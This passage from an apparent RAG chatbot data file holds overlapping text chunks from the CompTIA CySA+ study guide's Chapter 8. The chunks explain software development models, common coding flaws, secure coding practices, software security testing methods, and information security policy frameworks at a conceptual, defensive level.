focuses on the business model, including what information is important, how it is processed, and what the business process should involve 2. Data modeling, including gathering and analyzing all datasets and objects needed for the effort and defining their attributes and relationships 3. Process modeling for dataflows
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	instead, planning is done as the software is written. RAD relies on functional components of the code being developed in parallel and then integrated to produce the finished product. Much like Agile, RAD can provide a highly responsive development environment. RAD involves five phases, as shown in Figure 8.9. 1. Business modeling, which focuses on the business model, including what information is important, how it is processed, and what the business process should involve 2. Data modeling, including gathering and analyzing all datasets and objects needed for the effort and defining their attributes and relationships 3. Process modeling for dataflows based on the business model, as well as process descriptions for how data is handled 4. Application generation through coding and use of automated tools to convert data and process models into prototypes 5. Testing and turnover, which focuses on the dataflow and interfaces between components since prototypes are tested at each iteration for functionality FIGURE 8.9 Rapid Application Development prototypes Prototype I Prototype II Prototype X Business Modeling Business Modeling Business Modeling Data Modeling Data Modeling Data Modeling Process Modeling Process Modeling Process Modeling Application Generation Application Generation Application Generation Testing and Turnover Testing and Turnover Testing and Turnover 318 Chapter 8 ■ Responding to Vulnerabilities DevSecOps and DevOps DevOps combines software development and IT operations with the goal of optimizing the SDLC. This is done by using collections of tools called toolchains to improve the coding, building and test, packaging, release, configuration and configuration management, and monitoring elements of a software development life cycle. Of course, DevOps should have security baked into it as well. The term DevSecOps describes security as part of the DevOps model. In this model, security is a shared responsibility that is part of the entire development and operations cycle. That means integrating security into the design, development, testing, and operational work done to produce applications and services. The role of security practitioners in a DevSecOps model includes threat analysis and communications, planning, testing, providing feedback, and of course ongoing improvement and awareness responsibilities. To do this requires a strong understanding of the organization’s risk tolerance, as well as awareness of what the others involved in the DevSecOps environment are doing and when they are doing it. DevOps and DevSecOps are often combined with continuous integration and continuous deployment methodologies where they can rely on automated security testing, and integrated security tooling including scanning, updates, and configuration management tools to help ensure security. Continuous Integration and Continuous Deployment Continuous integration (CI) is a development practice that checks code into a shared repository on a consistent ongoing basis. In continuous integration environments, this can range from a few times a day to a very frequent process of check-­ins and automated builds. Since continuous integration relies on an automated build process, it also requires automated testing. It is also often paired with continuous deployment (CD) (sometimes called continuous delivery), which rolls out tested changes into production automatically as soon as they have been tested. Figure 8.10
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	updates, and configuration management tools to help ensure security. Continuous Integration and Continuous Deployment Continuous integration (CI) is a development practice that checks code into a shared repository on a consistent ongoing basis. In continuous integration environments, this can range from a few times a day to a very frequent process of check-­ins and automated builds. Since continuous integration relies on an automated build process, it also requires automated testing. It is also often paired with continuous deployment (CD) (sometimes called continuous delivery), which rolls out tested changes into production automatically as soon as they have been tested. Figure 8.10 shows a view of the continuous integration/continuous deployment pipeline. F I G U R E 8 . 10 Developer commits change The CI/CD pipeline Build process is triggered Build report delivered Tests run against build Tests report delivered If successful, code is deployed Using continuous integration and continuous deployment methods requires building automated security testing into the pipeline testing process. It can result in new vulnerabilities being deployed into production, and could allow an untrusted or rogue developer to insert flaws into code that is deployed, then remove the code as part of a deployment in the next cycle. This means that logging, reporting, and monitoring must all be designed to fit the CI/CD process. Designing and Coding for Security 319 Designing and Coding for Security Participating in the SDLC as a security professional provides significant opportunities to improve the security of applications. The first chance to help with software security is in the requirements gathering and design phases when security can be built in as part of the requirements and then designed in based on those requirements. Later, during the development process, secure coding techniques, code review, and testing can improve the quality and security of the code that is developed. During the testing phase, fully integrated software can be tested using tools like web application security scanners or penetration testing techniques. This also provides the foundation for ongoing security operations by building the baseline for future security scans and regression testing during patching and updates. Throughout these steps, it helps to understand the common security issues that developers face, create, and discover. Common Software Development Security Issues A multitude of development styles, languages, frameworks, and other variables may be involved in the creation of an application, but many of the same security issues are the same regardless of which you use. In fact, despite many development frameworks and languages providing security features, the same security problems continue to appear in applications all the time! Fortunately, a number of common best practices are available that you can use to help ensure software security for your organization. There are many software flaws that you may encounter as a security practitioner, but let’s focus on some of the most common, such as the following: ■■ ■■ ■■ Improper error handling, which often results in error messages that shouldn’t be exposed outside of a secure environment being accessible to attackers or the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	which you use. In fact, despite many development frameworks and languages providing security features, the same security problems continue to appear in applications all the time! Fortunately, a number of common best practices are available that you can use to help ensure software security for your organization. There are many software flaws that you may encounter as a security practitioner, but let’s focus on some of the most common, such as the following: ■■ ■■ ■■ Improper error handling, which often results in error messages that shouldn’t be exposed outside of a secure environment being accessible to attackers or the general public. Since errors often include detailed information about what is going on at the moment the error occurs, attackers can use them to learn about the application, databases, or even to get stack trace information providing significant detail they can leverage in further attacks. Errors that don’t appear to provide detailed information can still allow attackers to learn more about the application, as differing responses can give attackers clues about how successful their efforts are. As a security practitioner, you should pay careful attention to application vulnerability reports that show accessible error messages, as well as the content of those messages. Dereferencing issues are often due to null pointer dereferences. This means that a pointer with a value of NULL (in other words, one that isn’t set) is used as though it contains an expected value. This type of error almost always leads to a crash unless caught by an error handler. Race conditions, like those mentioned in a moment, are also a common place to find a dereferencing issue. Insecure object references occur when applications expose information about internal objects, allowing attackers to see how the object is identified and stored in a backend 320 Chapter 8 ■ Responding to Vulnerabilities storage system. Once an attacker knows that, they may be able to leverage the information to gain further access, or to make assumptions about other data objects that they cannot view in this way. ■■ ■■ ■■ ■■ ■■ ■■ ■■ Race conditions rely on timing. An application that needs to take action on an object may be sensitive to what is occurring or has occurred to that object. Although race conditions are not always reliable, they can be very powerful, and repeated attacks against a race condition can result in attackers succeeding. Broken authentication is exactly what it sounds like. Improperly implemented authentication may allow attackers who are not logged in, or who are not logged in as a user with the correct rights, access to resources. Implementing a strong and reliable authentication (and authorization!) system is an important part of application coding. Sensitive data exposure may occur when any of a number of flaws are exploited. The simplest version of this is when the application does not properly protect sensitive data, allowing attackers to access it. Insecure components include a broad range of issues introduced when a component of an application or service is vulnerable
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	what it sounds like. Improperly implemented authentication may allow attackers who are not logged in, or who are not logged in as a user with the correct rights, access to resources. Implementing a strong and reliable authentication (and authorization!) system is an important part of application coding. Sensitive data exposure may occur when any of a number of flaws are exploited. The simplest version of this is when the application does not properly protect sensitive data, allowing attackers to access it. Insecure components include a broad range of issues introduced when a component of an application or service is vulnerable and thus it introduces that vulnerability to the application. Understanding all of the components and modules that make up an application is critical to determining whether it may have known vulnerabilities that exist due to those components. Insufficient logging and monitoring will result in being unable to determine what occurred when something does go wrong. Part of a strong security design is determining what should be logged and monitored, ensuring that it is appropriately captured, and then building processes and systems to handle those logs and events so that the right thing happens when they occur. Weak or default configurations are common when applications and services are not properly set up or when default settings are used. One common example of this is using a default password for a service or database connection. Many application vulnerability scanners look for these default configurations, making it even easier for attackers to find them. Use of insecure functions can make it much harder to secure code. Functions like strcpy, which don’t have critical security features built in, can result in code that is easier for attackers to target. strcpy allows data to be copied without caring whether the source is bigger than the destination. If this occurs, attackers can place arbitrary data in memory locations past the original destination, possibly allowing a buffer overflow attack to succeed. Secure Coding Best Practices The best practices for producing secure code will vary depending on the application, its infrastructure and backend design, and what framework or language it is written in. Despite Software Security Testing 321 that, many of the same development, implementation, and design best practices apply to most applications. These include the following: ■■ ■■ ■■ ■■ ■■ ■■ Input validation helps prevent a wide range of problems, from cross-­site scripting (XSS) to SQL injection attacks. Output encoding translates special characters into an equivalent but safe version before a target application or interpreter reads it. This helps to prevent XSS attacks by preventing special characters from being inserted that cause the target application to perform an action. Secure session management ensures that attackers cannot hijack user sessions or that session issues don’t cause confusion among users. Authentication limits access to applications to only authenticated users or systems. Use multifactor authentication to help limit the impact of credential compromises. Data protection techniques, such as encryption, keep data protected against eavesdropping and other confidentiality violations while
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	injection attacks. Output encoding translates special characters into an equivalent but safe version before a target application or interpreter reads it. This helps to prevent XSS attacks by preventing special characters from being inserted that cause the target application to perform an action. Secure session management ensures that attackers cannot hijack user sessions or that session issues don’t cause confusion among users. Authentication limits access to applications to only authenticated users or systems. Use multifactor authentication to help limit the impact of credential compromises. Data protection techniques, such as encryption, keep data protected against eavesdropping and other confidentiality violations while stored or in transit over a network. Parameterized queries prevent SQL injection attacks by precompiling SQL queries so that new code may not be inserted when the query is executed. Exam Tip Be sure to know these best practices—­they’re listed directly in the CySA+ exam objectives and you’re likely to encounter them on the exam. Software Security Testing No matter how talented the development team for an application is, there will be some form of flaws in the code. A recent study by Veracode showed that 83 percent of the 1.4 million applications they scanned had at least one security flaw in the initial scan. That number points to a massive need for software security testing to continue to be better integrated into the software development life cycle. A broad variety of manual and automatic testing tools and methods are available to security professionals and developers. Fortunately, automated tools have continued to improve, providing an easier way to verify that code is more secure. Over the next few pages, we will review some of the critical software security testing methods and tools. 322 Chapter 8 ■ Responding to Vulnerabilities Software Assessment: Testing and Analyzing Code The source code that is the basis of every application and program can contain a variety of bugs and flaws, from programming and syntax errors to problems with business logic, error handling, and integration with other services and systems. It is important to be able to analyze the code to understand what it does, how it performs that task, and where flaws may occur in the program itself. This is often done via static or dynamic code analysis, along with testing methods like fuzzing, fault injection, mutation testing, and stress testing. Once changes are made to code and it is deployed, it must be regression tested to ensure that the fixes put in place didn’t create new security issues. Static Code Analysis Static code analysis (sometimes called source code analysis) is conducted by reviewing the code for an application. Since static analysis uses the source code for an application, it can be seen as a type of white-­box testing with full visibility to the testers. This can allow testers to find problems that other tests might miss, either because the logic is not exposed to other testing methods or because of internal business logic problems. Unlike many other methods, static analysis does not run the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	tested to ensure that the fixes put in place didn’t create new security issues. Static Code Analysis Static code analysis (sometimes called source code analysis) is conducted by reviewing the code for an application. Since static analysis uses the source code for an application, it can be seen as a type of white-­box testing with full visibility to the testers. This can allow testers to find problems that other tests might miss, either because the logic is not exposed to other testing methods or because of internal business logic problems. Unlike many other methods, static analysis does not run the program; instead, it focuses on understanding how the program is written and what the code is intended to do. Static code analysis can be conducted using automated tools or manually by reviewing the code—­a process sometimes called code understanding. Automated static code analysis can be very effective at finding known issues, and manual static code analysis helps identify programmer-­ induced errors. OWASP provides static code analysis tools for .NET, Java, PHP, C, and JSP, as well as a list of other static code analysis tools, at www.owasp .org/index.php/Static_Code_Analysis. Dynamic Code Analysis Dynamic code analysis relies on execution of the code while providing it with input to test the software. Much like static code analysis, dynamic code analysis may be done via automated tools or manually, but there is a strong preference for automated testing due to the volume of tests that need to be conducted in most dynamic code testing processes. Fuzzing Fuzz testing, or fuzzing, involves sending invalid or random data to an application to test its ability to handle unexpected data. The application is monitored to determine if it crashes, fails, or responds in an incorrect manner. Because of the large amount of data that a fuzz test involves, fuzzing is typically automated, and it is particularly useful for detecting input validation and logic issues as well as memory leaks and error handling. Unfortunately, fuzzing tends to identify only simple problems; it does not account for complex logic or business process issues and may not provide complete code coverage if its progress is not monitored. Software Security Testing 323 Exam Note Both static and dynamic analysis tools show up in Objective 2.1. You’ll need to know the differences between the two types of tools. Fuzzing is also directly listed in the objectives, so be sure to understand it! Fault Injection Unlike fuzzing, fault injection directly inserts faults into error handling paths, particularly error handling mechanisms that are rarely used or might otherwise be missed during normal testing. Fault injection may be done in one of three ways: ■■ ■■ ■■ Compile-­time injection, which inserts faults by modifying the source code of the application Protocol software fault injection, which uses fuzzing techniques to send unexpected or protocol noncompliant data to an application or service that expects protocol-­ compliant input Runtime injection of data into the running program, either by inserting it into the running memory of the program or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Fault Injection Unlike fuzzing, fault injection directly inserts faults into error handling paths, particularly error handling mechanisms that are rarely used or might otherwise be missed during normal testing. Fault injection may be done in one of three ways: ■■ ■■ ■■ Compile-­time injection, which inserts faults by modifying the source code of the application Protocol software fault injection, which uses fuzzing techniques to send unexpected or protocol noncompliant data to an application or service that expects protocol-­ compliant input Runtime injection of data into the running program, either by inserting it into the running memory of the program or by injecting the faults in a way that causes the program to deal with them Fault injection is typically done using automated tools due to the potential for human error in the fault injection process. Mutation Testing Mutation testing is related to fuzzing and fault injection, but rather than changing the inputs to the program or introducing faults to it, mutation testing makes small modifications to the program itself. The altered versions, or mutants, are then tested and rejected if they cause failures. The mutations themselves are guided by rules that are intended to create common errors as well as to replicate the types of errors that developers might introduce during their normal programing process. Much like fault injection, mutation testing helps identify issues with code that is infrequently used, but it can also help identify problems with test data and scripts by finding places where the scripts do not fully test for possible issues. Stress Testing and Load Testing Performance testing for applications is as important as testing for code flaws. Ensuring that applications and the systems that support them can stand up to the full production load they are anticipated to need is part of a typical SDLC process. When an application is ready to be tested, stress test applications and load testing tools are used to simulate a full application load, and in the case of stress testing, to go beyond any normal level of load to see how the application or system will respond when tested to the breaking point. 324 Chapter 8 ■ Responding to Vulnerabilities Stress and load testing should typically test for a worst-­case scenario. In fact, many organizations load-­test to the infrastructure’s breaking point so that they know what their worst-­case scenario is. With automatically scaling applications becoming more common, this is a lot harder to do, so setting a reasonable maximum load to test to is recommended if you have a scalable application or infrastructure. Stress testing can also be conducted against individual components of an application to ensure that they are capable of handling load conditions. During integration and component testing, fault injection may also be used to ensure that problems during heavy load are properly handled by the application. Security Regression Testing Regression testing focuses on testing to ensure that changes that have been made do not create new issues. From a security perspective, this often comes into play
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a lot harder to do, so setting a reasonable maximum load to test to is recommended if you have a scalable application or infrastructure. Stress testing can also be conducted against individual components of an application to ensure that they are capable of handling load conditions. During integration and component testing, fault injection may also be used to ensure that problems during heavy load are properly handled by the application. Security Regression Testing Regression testing focuses on testing to ensure that changes that have been made do not create new issues. From a security perspective, this often comes into play when patches are installed or when new updates are applied to a system or application. Security regression testing is performed to ensure that no new vulnerabilities, misconfigurations, or other issues have been introduced. Automated testing using tools like web application vulnerability scanners and other vulnerability scanning tools are often used as part of an automated or semiautomated regression testing process. Reports are generated to review the state of the application (and its underlying server and services) before and after changes are made to ensure that it remains secure. It isn’t uncommon for a vulnerability to be introduced by a patch or fix. Coders who are not following best practices for code commits and other good habits for version control may accidentally put code that was previously fixed back into a new release without noticing the problem. Change control as well as version and source code management practices are critical to preventing this. User Acceptance Testing In addition to the many types of security testing, user acceptance testing (UAT) is an important element in the testing cycle. Once all of the functional and security testing is completed for an application or program, users are asked to validate whether it meets the business needs and usability requirements. Since developers rarely know or perform all of the business functions that the applications they write will perform, this stage is particularly important to validate that things work like they should in normal use. Ideally UAT should have a formal test plan that involves examples of all of the common business processes that the users of the application will perform. This should be paired with Policies, Governance, and Service Level Objectives 325 acceptance criteria that indicate what requirements must be satisfied to consider the work acceptable and thus ready to move into production. Debuggers Debuggers also play an important role in code testing. These tools, designed to support developers in troubleshooting their work, also allow testers to perform dynamic analysis of executable files. As you prepare for the exam, you should be familiar with two common debugging tools: ■■ ■■ Immunity debugger is designed specifically to support penetration testing and the reverse engineering of malware. GNU debugger (GDB) is a widely used open source debugger for Linux that works with a variety of programming languages. Penetration testers may also attempt to use debuggers and related tools to perform the decompilation of code. This process attempts
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	also play an important role in code testing. These tools, designed to support developers in troubleshooting their work, also allow testers to perform dynamic analysis of executable files. As you prepare for the exam, you should be familiar with two common debugging tools: ■■ ■■ Immunity debugger is designed specifically to support penetration testing and the reverse engineering of malware. GNU debugger (GDB) is a widely used open source debugger for Linux that works with a variety of programming languages. Penetration testers may also attempt to use debuggers and related tools to perform the decompilation of code. This process attempts to take an executable file and perform reverse engineering to convert it back into source code. This process is quite difficult and rarely successful. Policies, Governance, and Service Level Objectives An organization’s information security policy framework contains a series of documents designed to describe the organization’s cybersecurity program. The scope and complexity of these documents vary widely, depending on the nature of the organization and its information resources. These frameworks generally include four different types of documents: ■■ Policies ■■ Standards ■■ Procedures ■■ Guidelines In the remainder of this section, you’ll learn the differences between each of these document types. However, keep in mind that the definitions of these categories vary significantly from organization to organization, and it is very common to find the lines between them blurred. Though at first glance that may seem “incorrect,” it’s a natural occurrence as security theory meets the real world. As long as the documents are achieving their desired purpose, there’s no harm and no foul. 326 Chapter 8 ■ Responding to Vulnerabilities Policies Policies are high-­level statements of management intent. Compliance with policies is mandatory. An information security policy will generally contain broad statements about cybersecurity objectives, including: ■■ ■■ ■■ ■■ ■■ A statement of the importance of cybersecurity to the organization Requirements that all staff and contracts take measures to protect the confidentiality, integrity, and availability of information and information systems Statement on the ownership of information created and/or possessed by the organization Designation of the chief information security officer (CISO) or other individual as the executive responsible for cybersecurity issues Delegation of authority granting the CISO the ability to create standards, procedures, and guidelines that implement the policy In many organizations, the process to create a policy is laborious and requires very high-­ level approval, often from the chief executive officer (CEO). Keeping policy statements at a high level provides the CISO with the flexibility to adapt and change specific security requirements with changes in the business and technology environments. For example, the five-­page information security policy at the University of Notre Dame simply states that: The Information Governance Committee will create handling standards for each Highly Sensitive data element. Data stewards may create standards for other data elements under their stewardship. These information handling standards will specify controls to manage risks to University information and related assets based on their classification. All individuals at the University are
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	chief executive officer (CEO). Keeping policy statements at a high level provides the CISO with the flexibility to adapt and change specific security requirements with changes in the business and technology environments. For example, the five-­page information security policy at the University of Notre Dame simply states that: The Information Governance Committee will create handling standards for each Highly Sensitive data element. Data stewards may create standards for other data elements under their stewardship. These information handling standards will specify controls to manage risks to University information and related assets based on their classification. All individuals at the University are responsible for complying with these controls. By way of contrast, the federal government’s Centers for Medicare & Medicaid Services (CMS) has a 95-­page information security policy. This mammoth document contains incredibly detailed requirements, such as: A record of all requests for monitoring must be maintained by the CMS CIO along with any other summary results or documentation produced during the period of monitoring. The record must also reflect the scope of the monitoring by documenting search terms and techniques. All information collected from monitoring must be controlled and protected with distribution limited to the individuals identified in the request for monitoring and other individuals specifically designated by the CMS Administrator or CMS CIO as having a specific need to know such information. This approach may meet the needs of CMS, but it is hard to imagine the long-­term maintenance of that document. Lengthy security policies often quickly become outdated as necessary changes to individual requirements accumulate and become neglected because staff are weary of continually publishing new versions of the policy. Policies, Governance, and Service Level Objectives 327 Organizations commonly include the following documents in their information security policy library: ■■ ■■ ■■ ■■ ■■ ■■ ■■ ■■ ■■ Information security policy that provides high-­level authority and guidance for the security program Acceptable use policy (AUP) that provides network and system users with clear direction on permissible uses of information resources Data ownership policy that clearly states the ownership of information created or used by the organization Data classification policy that describes the classification structure used by the organization and the process used to properly assign classifications to data Data retention policy that outlines what information the organization will maintain and the length of time different categories of work product will be retained prior to destruction Account management policy that describes the account life cycle from provisioning through active use and decommissioning Password policy that sets forth requirements for password length, complexity, reuse, and similar issues Continuous monitoring policy that describes the organization’s approach to monitoring and informs employees that their activity is subject to monitoring in the workplace Code of conduct/ethics that describes expected behavior of employees and affiliates and serves as a backstop for situations not specifically addressed in policy As you read through the list, you may notice that some of the documents listed tend to conflict with our description of policies as high-­level documents and seem
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	describes the account life cycle from provisioning through active use and decommissioning Password policy that sets forth requirements for password length, complexity, reuse, and similar issues Continuous monitoring policy that describes the organization’s approach to monitoring and informs employees that their activity is subject to monitoring in the workplace Code of conduct/ethics that describes expected behavior of employees and affiliates and serves as a backstop for situations not specifically addressed in policy As you read through the list, you may notice that some of the documents listed tend to conflict with our description of policies as high-­level documents and seem to better fit the definition of a standard in the next section. That’s a reasonable conclusion to draw. CompTIA specifically includes these items as elements of information security policy while many organizations would move some of them, such as password requirements, into standards documents. Standards Standards provide mandatory requirements describing how an organization will carry out its information security policies. These may include the specific configuration settings used for a common operating system, the controls that must be put in place for highly sensitive information, or any other security objective. Standards are typically approved at a lower organizational level than policies and, therefore, may change more regularly. For example, the University of California at Berkeley maintains a detailed document titled the Minimum Security Standards for Electronic Information, available online at https://security.berkeley.edu/minimum-­security-­standards-­electronic-­ information. This document divides information into four different data protection levels (DPLs) and then describes what controls are required, optional, or not required for data at different levels using a detailed matrix. An excerpt from this matrix appears in Figure 8.11. 328 Chapter 8 F I G U R E 8 . 11 Information ■ Responding to Vulnerabilities Excerpt from UC Berkeley Minimum Security Standards for Electronic Source: University of California at Berkeley Minimum Security Standards for Electronic Information The standard then provides detailed descriptions for each of these requirements with definitions of the terms used in the requirements. For example, requirement 3.1 in Figure 8.11 simply reads “Secure configurations.” Later in the document, UC Berkeley expands this to read “Resource Custodians must utilize well-­managed security configurations for hardware, software, and operating systems based on industry standards.” It goes on to define “well-­ managed” as: ■■ ■■ ■■ Devices must have secure configurations in place prior to deployment. Any deviations from defined security configurations must be approved through a change management process and documented. A process must exist to annually review deviations from the defined security configurations for continued relevance. A process must exist to regularly check configurations of devices and alert the Resource Custodian of any changes. This approach provides a document hierarchy that is easy to navigate for the reader and provides access to increasing levels of detail as needed. Notice also that many of the requirement lines in Figure 8.11 provide links to guidelines. Clicking on those links leads to advice to organizations subject to this policy that begins with this text: UC Berkeley security policy
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	change management process and documented. A process must exist to annually review deviations from the defined security configurations for continued relevance. A process must exist to regularly check configurations of devices and alert the Resource Custodian of any changes. This approach provides a document hierarchy that is easy to navigate for the reader and provides access to increasing levels of detail as needed. Notice also that many of the requirement lines in Figure 8.11 provide links to guidelines. Clicking on those links leads to advice to organizations subject to this policy that begins with this text: UC Berkeley security policy mandates compliance with Minimum Security Standards for Electronic Information for devices handling covered data. The recommendations below are provided as optional guidance. Policies, Governance, and Service Level Objectives 329 This is a perfect example of three elements of the information security policy framework working together. Policy sets out the high-­level objectives of the security program and requires compliance with standards, which includes details of required security controls. Guidelines provide advice to organizations seeking to comply with the policy and standards. In some cases, organizations may operate in industries that have commonly accepted standards that the organization either must follow due to a regulatory requirement or choose to follow as a best practice. Failure to follow industry best practices may be seen as negligence and can cause legal liability for the organization. Many of these industry standards are expressed in the standard frameworks discussed later in this chapter. Service Level Objectives Organizations that offer technology services to customers may define service level objectives (SLOs) that set formal expectations for service availability, data preservation, and other key requirements. For example, the organization might set an SLO that customer-­ facing systems have 99.999% (or “five nines”) of uptime. This means that the system would average less than six minutes of downtime each year. SLOs are documented in service level agreements (SLAs) that are formal documents typically included in customer contracts. SLAs may include penalties for vendors who fail to meet their SLOs, such as refunding a portion of the service’s fees. Procedures Procedures are detailed, step-­by-­step processes that individuals and organizations must follow in specific circumstances. Similar to checklists, procedures ensure a consistent process for achieving a security objective. Organizations may create procedures for building new systems, releasing code to production environments, responding to security incidents, and many other tasks. Compliance with procedures is mandatory. For example, Visa publishes a document titled What to Do If Compromised (https://usa.visa.com/dam/VCOM/download/merchants/ cisp-­what-­to-­do-­if-­compromised.pdf) that lays out a mandatory process that merchants suspecting a credit card compromise must follow. Although the document doesn’t contain the word procedure in the title, the introduction clearly states that the document “establishes procedures and timelines for reporting and responding to a suspected or confirmed Compromise Event.” The document provides requirements covering the following areas of incident response: ■■ Notify Visa of the incident within three days. ■■ Provide Visa with an initial investigation report. ■■ Provide notice to other relevant parties. Chapter
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	is mandatory. For example, Visa publishes a document titled What to Do If Compromised (https://usa.visa.com/dam/VCOM/download/merchants/ cisp-­what-­to-­do-­if-­compromised.pdf) that lays out a mandatory process that merchants suspecting a credit card compromise must follow. Although the document doesn’t contain the word procedure in the title, the introduction clearly states that the document “establishes procedures and timelines for reporting and responding to a suspected or confirmed Compromise Event.” The document provides requirements covering the following areas of incident response: ■■ Notify Visa of the incident within three days. ■■ Provide Visa with an initial investigation report. ■■ Provide notice to other relevant parties. Chapter 8 330 ■ Responding to Vulnerabilities ■■ Provide exposed payment account data to Visa. ■■ Conduct PCI forensic investigation. ■■ Conduct independent investigation. ■■ Preserve evidence. Each of these sections provides detailed information on how Visa expects merchants to handle incident response activities. For example, the forensic investigation section describes the use of Payment Card Industry Forensic Investigators (PFI) and reads as follows: Upon discovery of an account data compromise, or receipt of an independent forensic investigation notification, an entity must: ■■ ■■ ■■ Engage a PFI (or sign a contract) within five (5) business days. Provide Visa with the initial forensic (i.e., preliminary) report within ten (10) business days from when the PFI is engaged (or the contract is signed). Provide Visa with a final forensic report within ten (10) business days of the completion of the review. There’s not much room for interpretation in this type of language. Visa is laying out a clear and mandatory procedure describing what actions the merchant must take, the type of investigator they should hire, and the timeline for completing different milestones. Organizations commonly include the following procedures in their policy frameworks: ■■ ■■ ■■ Monitoring procedures that describe how the organization will perform security monitoring activities, including the possible use of continuous monitoring technology Evidence production procedures that describe how the organization will respond to subpoenas, court orders, and other legitimate requests to produce digital evidence Patching procedures that describe the frequency and process of applying patches to applications and systems under the organization’s care Of course, cybersecurity teams may decide to include many other types of procedures in their frameworks, as dictated by the organization’s operational needs. Guidelines Guidelines provide best practices and recommendations related to a given concept, technology, or task. Compliance with guidelines is not mandatory, and guidelines are offered in the spirit of providing helpful advice. That said, the “optionality” of guidelines may vary significantly depending on the organization’s culture. In April 2016, the chief information officer (CIO) of the state of Washington published a 25-­page document providing guidelines on the use of electronic signatures by state agencies. The document is not designed to be obligatory but rather offers advice to agencies seeking to adopt electronic signature technology. The document begins with a purpose section that outlines three goals of the guideline: Policies, Governance, and Service Level Objectives 331 1. Help agencies determine if, and to what
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are offered in the spirit of providing helpful advice. That said, the “optionality” of guidelines may vary significantly depending on the organization’s culture. In April 2016, the chief information officer (CIO) of the state of Washington published a 25-­page document providing guidelines on the use of electronic signatures by state agencies. The document is not designed to be obligatory but rather offers advice to agencies seeking to adopt electronic signature technology. The document begins with a purpose section that outlines three goals of the guideline: Policies, Governance, and Service Level Objectives 331 1. Help agencies determine if, and to what extent, their agency will implement and rely on electronic records and electronic signatures. 2. Provide agencies with information they can use to establish policy or rule governing their use and acceptance of digital signatures. 3. Provide direction to agencies for sharing of their policies with the Office of the Chief Information Officer (OCIO) pursuant to state law. The first two stated objectives line up completely with the function of a guideline. Phrases like “help agencies determine” and “provide agencies with information” are common in guideline documents. There is nothing mandatory about them and, in fact, the guidelines explicitly state that Washington state law “does not mandate that any state agency accept or require electronic signatures or records.” The third objective might seem a little strange to include in a guideline. Phrases like “provide direction” are more commonly found in policies and procedures. Browsing through the document, the text relating to this objective is only a single paragraph within a 25-­page document, reading: The Office of the Chief Information Officer maintains a page on the OCIO .wa.gov website listing links to individual agency electronic signature and record submission policies. As agencies publish their policies, the link and agency contact information should be emailed to the OCIO Policy Mailbox. The information will be added to the page within 5 working days. Agencies are responsible for notifying the OCIO if the information changes. Reading this paragraph, the text does appear to clearly outline a mandatory procedure and would not be appropriate in a guideline document that fits within the strict definition of the term. However, it is likely that the committee drafting this document thought it would be much more convenient to the reader to include this explanatory text in the related guideline rather than drafting a separate procedure document for a fairly mundane and simple task. The full Washington state document, Electronic Signature Guidelines, is available for download from the Washington State CIO’s website at https://ocio.wa.gov/policy/electronic-­signature-­guidelines. Exceptions and Compensating Controls When adopting new security policies, standards, and procedures, organizations should also provide a mechanism for exceptions to those rules. Inevitably, unforeseen circumstances will arise that require a deviation from the requirements. The policy framework should lay out the specific requirements for receiving an exception and the individual or committee with the authority to approve exceptions. 332 Chapter 8 ■ Responding to Vulnerabilities The state of Washington uses an exception process that requires
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	mundane and simple task. The full Washington state document, Electronic Signature Guidelines, is available for download from the Washington State CIO’s website at https://ocio.wa.gov/policy/electronic-­signature-­guidelines. Exceptions and Compensating Controls When adopting new security policies, standards, and procedures, organizations should also provide a mechanism for exceptions to those rules. Inevitably, unforeseen circumstances will arise that require a deviation from the requirements. The policy framework should lay out the specific requirements for receiving an exception and the individual or committee with the authority to approve exceptions. 332 Chapter 8 ■ Responding to Vulnerabilities The state of Washington uses an exception process that requires the requestor document the following information: ■■ Standard/requirement that requires an exception ■■ Reason for noncompliance with the requirement ■■ Business and/or technical justification for the exception ■■ Scope and duration of the exception ■■ Risks associated with the exception ■■ Description of any supplemental controls that mitigate the risks associated with the exception ■■ Plan for achieving compliance ■■ Identification of any unmitigated risks Many exception processes require the use of compensating controls to mitigate the risk associated with exceptions to security standards. The Payment Card Industry Data Security Standard (PCI DSS) includes one of the most formal compensating control processes in use today. It sets out three criteria that must be met for a compensating control to be satisfactory: 1. The control must meet the intent and rigor of the original requirement. 2. The control must provide a similar level of defense as the original requirement, such that the compensating control sufficiently offsets the risk that the original PCI DSS requirement was designed to defend against. 3. The control must be “above and beyond” other PCI DSS requirements. For example, an organization might find that it needs to run an outdated version of an operating system on a specific machine because software necessary to run the business will only function on that operating system version. Most security policies would prohibit using the outdated operating system because it might be susceptible to security vulnerabilities. The organization could choose to run this system on an isolated network with either very little or no access to other systems as a compensating control. The general idea is that a compensating control finds alternative means to achieve an objective when the organization cannot meet the original control requirement. While PCI DSS offers a very formal process for compensating controls, the use of compensating controls is a common strategy in many different organizations, even those not subject to PCI DSS. Compensating controls balance the fact that it simply isn’t possible to implement every required security control in every circumstance with the desire to manage risk to the greatest feasible degree. In many cases, organizations adopt compensating controls to address a temporary exception to a security requirement. In those cases, the organization should also develop remediation plans designed to bring the organization back into compliance with the letter and intent of the original control. Exam Essentials 333 Summary Cybersecurity efforts are all about risk and
